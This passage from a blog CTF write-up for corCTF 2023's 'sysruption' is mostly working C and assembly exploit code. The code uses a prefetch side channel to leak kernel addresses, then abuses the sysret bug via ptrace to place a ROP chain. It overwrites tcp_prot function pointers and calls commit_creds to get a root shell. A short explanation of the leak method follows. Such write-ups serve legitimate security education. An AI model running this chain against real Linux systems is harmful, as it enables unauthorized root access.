</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">overwrite_ioctl</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-keyword" style="color: blue;">struct</span> user_regs_struct *regs)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> 
{
    regs-&gt;r9 = push_rcx_jmp_ptr_rcx;
}

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *stack_addr = </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">win</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">()</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> fd = open(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/root/flag.txt"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, O_RDONLY);
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> buf[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">300</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">];
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> n = read(fd, buf, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buf));
    write(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, buf, n);
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"r000000000t"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    system(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/bin/sh"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
}

__attribute__((naked)) </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">escaped_from_hell</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">()</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">asm</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">volatile</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(
        <span class="hljs-string" style="color: #a31515;">".intel_syntax noprefix;"</span>
        <span class="hljs-string" style="color: #a31515;">"lea rsp, qword ptr [rip + stack_addr];"</span>
        <span class="hljs-string" style="color: #a31515;">"mov rsp, qword ptr [rsp];"</span>
        <span class="hljs-string" style="color: #a31515;">"mov rax, 0xff;"</span>
        <span class="hljs-string" style="color: #a31515;">"not rax;"</span>
        <span class="hljs-string" style="color: #a31515;">"and rsp, rax;"</span>
        <span class="hljs-string" style="color: #a31515;">"push rax;"</span>
        <span class="hljs-string" style="color: #a31515;">"call win;"</span>
        <span class="hljs-string" style="color: #a31515;">".att_syntax;"</span>
        :::)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
}

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">trigger_sysret_bug</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">uint64_t</span> <span class="hljs-built_in" style="color: blue;">stack</span>, <span class="hljs-type" style="color: #a31515;">void</span> (*setup_regs)(<span class="hljs-keyword" style="color: blue;">struct</span> user_regs_struct *reg))</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    </span><span class="hljs-class" style="font-family: monospace; white-space: pre;"><span class="hljs-keyword" style="color: blue;">struct</span> <span class="hljs-title" style="color: #a31515;">user_regs_struct</span> <span class="hljs-title" style="color: #a31515;">regs</span>;</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> status;

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">pid_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> chld;

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> ((chld = fork()) &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) {
        perror(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"fork"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (chld == </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) {
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (ptrace(PTRACE_TRACEME, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) != </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) {
            perror(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"PTRACE_TRACEME"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }
        raise(SIGSTOP);
        </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// if ptrace set regs too many at once, simply just fails and never triggers sysret bug</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
        </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// not sure why this is the case, so set registers before ptrace</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">asm</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">volatile</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(
            <span class="hljs-string" style="color: #a31515;">".intel_syntax noprefix;"</span>
            <span class="hljs-string" style="color: #a31515;">"mov r14, qword ptr [pop_rsp_rsi];"</span>
            <span class="hljs-string" style="color: #a31515;">"mov r13, qword ptr [pop_rdi];"</span>
            <span class="hljs-string" style="color: #a31515;">"mov r12, qword ptr [init_cred];"</span>
            <span class="hljs-string" style="color: #a31515;">"mov rbp, qword ptr [commit_creds];"</span>
            <span class="hljs-string" style="color: #a31515;">"mov rbx, qword ptr [trampoline];"</span>
            <span class="hljs-string" style="color: #a31515;">"mov r11, 0xdeadbeef;"</span>
            <span class="hljs-string" style="color: #a31515;">"mov r10, 0xbaadf00d;"</span>
            <span class="hljs-string" style="color: #a31515;">"lea r9, qword ptr [rip + escaped_from_hell];"</span>
            <span class="hljs-string" style="color: #a31515;">"mov r8, 0x33;"</span>
            <span class="hljs-comment" style="color: green;">// no need for stack, we can restore in naked function in asm, otherwise interfere with rax</span>
            <span class="hljs-string" style="color: #a31515;">"mov rdx, 0x2b;"</span>
            <span class="hljs-string" style="color: #a31515;">"mov rax, 57;"</span>
            <span class="hljs-string" style="color: #a31515;">"syscall;"</span>
            <span class="hljs-string" style="color: #a31515;">"ud2;"</span>
            <span class="hljs-string" style="color: #a31515;">".att_syntax;"</span>:::)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    }


    waitpid(chld, &amp;status, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    ptrace(PTRACE_SETOPTIONS, chld, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, PTRACE_O_TRACEFORK);

    ptrace(PTRACE_CONT, chld, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    waitpid(chld, &amp;status, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    ptrace(PTRACE_GETREGS, chld, </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, &amp;regs);

    regs.rcx = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x8fffffffffff1337</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    regs.rip = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x8fffffffffff1337</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    regs.rsp = </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">stack</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    setup_regs(&amp;regs);


    ptrace(PTRACE_SETREGS, chld, </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, &amp;regs);

    ptrace(PTRACE_CONT, chld, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    ptrace(PTRACE_DETACH, chld, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
}



</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">main</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">int</span> argc, <span class="hljs-type" style="color: #a31515;">char</span> **argv)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> 
{
    assign_to_core(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> fd = socket(AF_INET, SOCK_STREAM, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (argc == </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">2</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
        threshold = atoi(argv[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">]);

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// current threshold causes it to leak etext</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> kbase = prefetch_leak(KERNEL_BOTTOM, KERNEL_TOP, KERNEL_STEP) - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xc00000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> curr_cpu_gsbase = (prefetch_leak(PHYSMAP_BOTTOM, PHYSMAP_TOP, PHYSMAP_STEP) &amp; ~((</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1ull</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">&lt;&lt;</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)) - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x100000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x13bc00000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> evil_stack = curr_cpu_gsbase + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x860</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">printf</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"kbase: 0x%lx\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, kbase);
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">printf</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"current cpu gsbase: 0x%lx\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, curr_cpu_gsbase);

    stack_addr = &amp;fd;
    trampoline += kbase;
    pop_rsp += kbase;
    pop_rsp_rsi += kbase;
    push_rcx_jmp_ptr_rcx += kbase;
    pop_rsi_rdi_rbp += kbase;
    pop_rdi_rcx += kbase;
    pop_rdi += kbase;
    tcp_prot += kbase;
    commit_creds += kbase;
    init_cred += kbase;

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">printf</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"stack pivot: 0x%lx\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, push_rcx_jmp_ptr_rcx);

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">asm</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">volatile</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(
        <span class="hljs-string" style="color: #a31515;">".intel_syntax noprefix;"</span>
        <span class="hljs-string" style="color: #a31515;">"mov rax, %0;"</span>
        <span class="hljs-string" style="color: #a31515;">"wrgsbase rax;"</span>
        <span class="hljs-string" style="color: #a31515;">".att_syntax;"</span>::<span class="hljs-string" style="color: #a31515;">"r"</span>(curr_cpu_gsbase):<span class="hljs-string" style="color: #a31515;">"rax"</span>)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"calling wrgsbase"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"writing rop chain into current cpu gs base"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// write rop chain to gs base first</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fork() == </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
        trigger_sysret_bug(evil_stack, &amp;nopper);
    wait(</span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    sleep(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    evil_stack = tcp_prot + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xb8</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// overwrite ioctl in tcp proto</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"overwriting tcp_prot func pointers"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fork() == </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
        trigger_sysret_bug(evil_stack, &amp;overwrite_ioctl);
    wait(</span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);


    sleep(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    getchar();
    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// target setsockopt func ptr</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"triggering ROP"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    setsockopt(fd, SOL_TCP, TCP_ULP, curr_cpu_gsbase + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x7c0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1337</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"hi"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
  }</span></span></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjAcUiuYEopYBfYCk1IqxWFONjV-k1vfeveEGLol7ESAsZseJ9ebCoMy54NzObP6roMDYEKkROfFyDmE1SvZubmK8knHo7hNtQAo9jyJH8DIQlnj4WupkieaHufbAr-DhTr8z1RmDphClRjQXXm-bi07ul1Nb77UQHqYygQqgh5g2VtFdkwWgMUn0qAnr9/s1000/sysruption.gif" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="599" data-original-width="1000" height="384" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/sysruption.gif" width="640"></a></div><p>One interesting thing noticeable in the exploit is my adjusted 
strategy for prefetching. In my original EntryBleed PoC, I used simple 
averages. After doing a lot more micro-architectural attacks in the past
 year, I believe scoring leak candidates through a threshold system is a
 much better strategy and less susceptible to extreme outliers that 
would skew averaging. This threshold would be 
different across different CPUs, but would not be difficult to 
enumerate. Sometimes, the leak in my exploit is wrong (especially for kernel base), but I hypothesize 
that the accuracy could be improved if I performed a ton of memory 
accesses beforehand to help flush the TLB a bit more.</p>
<p>This concludes my writeups for corCTF 2023! Feel free to ask any 
questions about this or point out any mistakes. I hope people had a lot 
of fun with sysruption, especially as it combined a hardware quirk, a µarch attack, and a kernel exploit in one challenge as the description 
mentioned 😉. Congrats once again to Zolutal for the first blood, and to
 <a href="https://twitter.com/sampriti0" target="_blank">sampriti</a> and team <a href="https://balsn.tw/" target="_blank">Balsn</a> for second and third bloods, and thanks again to 6.888 for inspiring the components for this challenge!</p><p><br></p>
<div style="clear: both;"></div>
</div>
<div class="post-footer">
<div class="post-footer-line post-footer-line-1">
<span class="post-author vcard">
Posted by
<span class="fn" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person">
<span itemprop="name">willsroot</span>
</span>
</span>
<span class="post-timestamp">
at
<meta content="https://www.willsroot.io/2023/08/sysruption.html" itemprop="url">
<a class="timestamp-link" href="https://www.willsroot.io/2023/08/sysruption.html" rel="bookmark" title="permanent link"><abbr class="published" itemprop="datePublished" title="2023-08-02T17:36:00-07:00">5:36 PM</abbr></a>
</span>
<span class="post-comment-link">
</span>
<span class="post-icons">
<span class="item-control blog-admin pid-1768080780">
<a href="https://www.blogger.com/post-edit.g?blogID=8814147965526194982&amp;postID=7906062095855303988&amp;from=pencil" title="Edit Post">
<img alt="" class="icon-action" height="18" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/icon18_edit_allbkg.gif" width="18">
</a>
</span>
</span>
<div class="post-share-buttons goog-inline-block">
<a class="goog-inline-block share-button sb-email" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=7906062095855303988&amp;target=email" target="_blank" title="Email This"><span class="share-button-link-text">Email This</span></a><a class="goog-inline-block share-button sb-blog" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=7906062095855303988&amp;target=blog" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=270,width=475&quot;); return false;" target="_blank" title="BlogThis!"><span class="share-button-link-text">BlogThis!</span></a><a class="goog-inline-block share-button sb-twitter" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=7906062095855303988&amp;target=twitter" target="_blank" title="Share to Twitter"><span class="share-button-link-text">Share to Twitter</span></a><a class="goog-inline-block share-button sb-facebook" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=7906062095855303988&amp;target=facebook" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=430,width=640&quot;); return false;" target="_blank" title="Share to Facebook"><span class="share-button-link-text">Share to Facebook</span></a><a class="goog-inline-block share-button sb-pinterest" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=7906062095855303988&amp;target=pinterest" target="_blank" title="Share to Pinterest"><span class="share-button-link-text">Share to Pinterest</span></a>
</div>
</div>
<div class="post-footer-line post-footer-line-2">
<span class="post-labels">
</span>
</div>
<div class="post-footer-line post-footer-line-3">
<span class="post-location">
</span>
</div>
</div>
</div>
<div class="comments" id="comments">
<a name="comments"></a>
<h4>No comments:</h4>
<div id="Blog1_comments-block-wrapper">
<dl class="avatar-comment-indent" id="comments-block">
</dl>
</div>
<p class="comment-footer">
</p><div class="comment-form">
<a name="comment-form"></a>
<h4 id="comment-post-message">Post a Comment</h4>
<p>
</p>
<a href="https://www.blogger.com/comment/frame/8814147965526194982?po=7906062095855303988&amp;hl=en&amp;blogspotRpcToken=2297522" id="comment-editor-src"></a>
<iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" frameborder="0" height="66px" id="comment-editor" name="comment-editor" src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/8814147965526194982.html" width="100%" data-resized="true"></iframe>
<script src="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/3988816102-comment_from_post_iframe.js.下載" type="text/javascript"></script>
<script type="text/javascript">
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
<p></p>
</div>
</div>

        </div></div>
      
</div>
<div class="blog-pager" id="blog-pager">
<span id="blog-pager-older-link">
<a class="blog-pager-older-link" href="https://www.willsroot.io/2023/08/smm-diary-writeup.html" id="Blog1_blog-pager-older-link" title="Older Post">Older Post</a>
</span>
<a class="home-link" href="https://www.willsroot.io/">Home</a>
</div>
<div class="clear"></div>
<div class="post-feeds">
<div class="feed-links">
Subscribe to:
<a class="feed-link" href="https://www.willsroot.io/feeds/7906062095855303988/comments/default" target="_blank" type="application/atom+xml">Post Comments (Atom)</a>
</div>
</div>
</div></div>
</div>
</div>
<div class="column-left-outer">
<div class="column-left-inner">
<aside>
</aside>
</div>
</div>
<div class="column-right-outer">
<div class="column-right-inner">
<aside>
<div class="sidebar section" id="sidebar-right-1"><div class="widget Text" data-version="1" id="Text1">
<h2 class="title">Contact</h2>
<div class="widget-content">
For further inquiries, contact me at <a href="mailto:will@willsroot.io">will@willsroot.io</a>. Feel free to use my <a href="https://www.willsroot.io/p/pgp-key.html">PGP key</a>.
</div>
<div class="clear"></div>
</div><div class="widget HTML" data-version="1" id="HTML2">
<h2 class="title">Github</h2>
<div class="widget-content">
Click <a href="https://github.com/BitsByWill">here</a> to access my Github page.
</div>
<div class="clear"></div>
</div><div class="widget BlogArchive" data-version="1" id="BlogArchive1">
<h2>Blog Archive</h2>
<div class="widget-content">
<div id="ArchiveList">
<div id="BlogArchive1_ArchiveList">
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2023/">
2023
</a>
<span class="post-count" dir="ltr">(3)</span>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2023/08/">
August
</a>
<span class="post-count" dir="ltr">(3)</span>
<ul class="posts">
<li><a href="https://www.willsroot.io/2023/08/sysruption.html">corCTF 2023 sysruption - Exploiting Sysret on Linu...</a></li>
<li><a href="https://www.willsroot.io/2023/08/smm-diary-writeup.html">corCTF 2023 smm-diary: Ropping in Ring -2</a></li>
<li><a href="https://www.willsroot.io/2023/08/vmquack-avx512.html">corCTF 2023 vmquack's vectorized vices: VM Obfusca...</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2022/">
2022
</a>
<span class="post-count" dir="ltr">(4)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2022/12/">
December
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
